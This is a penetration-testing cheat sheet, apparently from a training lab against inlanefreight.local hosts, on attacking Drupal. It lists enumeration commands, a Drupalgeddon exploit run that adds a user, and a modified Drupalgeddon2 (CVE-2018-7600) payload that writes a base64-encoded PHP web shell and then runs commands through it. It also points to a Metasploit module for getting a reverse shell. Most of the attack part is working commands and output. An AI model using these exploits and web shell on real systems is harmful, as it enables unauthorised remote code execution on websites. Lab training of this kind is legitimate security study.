### Enumeration

```bash
curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
```

```bash
curl -s http://drupal.inlanefreight.local/CHANGELOG.txt
```

```bash
droopescan scan drupal -u http://drupal.inlanefreight.local
```
### Attack

#### Drupalgeddon

Adds a new user for version 7.31 and below

- Download exploit: https://www.exploit-db.com/exploits/34992

```bash
python2.7 34992.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
```
#### Drupalgeddon2

Affects Druple < 8.3.9 / < 8.4.6 / < 8.5.1

- Download exploit: https://www.exploit-db.com/exploits/44448
- Modify exploit as you see fir

E.g.:

```bash
echo '<?php system($_GET[cmd]);?>' | base64
PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8+Cg==
```

Update exploit:

```bash
payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'echo "PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8+Cg==" | base64 -d | tee shell.php'}
```

Run Exploit:

```bash
python3 44448.py 
################################################################
# Proof-Of-Concept for CVE-2018-7600
# by Vitalii Rudnykh
# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders
# https://github.com/a2u/CVE-2018-7600
################################################################
Provided only for educational or information purposes

Enter target url (example: https://domain.ltd/): http://drupal-dev.inlanefreight.local/

Check: http://drupal-dev.inlanefreight.local/shell.php
```

RCE:

```bash
curl -s http://drupal-dev.inlanefreight.local/shell.php?cmd=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
#### Drupalgeddon3

Use the Metasploit module `multi/http/drupal_drupageddon3`. For this we need to use the `
`drupal_session` which can be obtained from a valid login session. From there, it is possible to obtain a reverse shell.

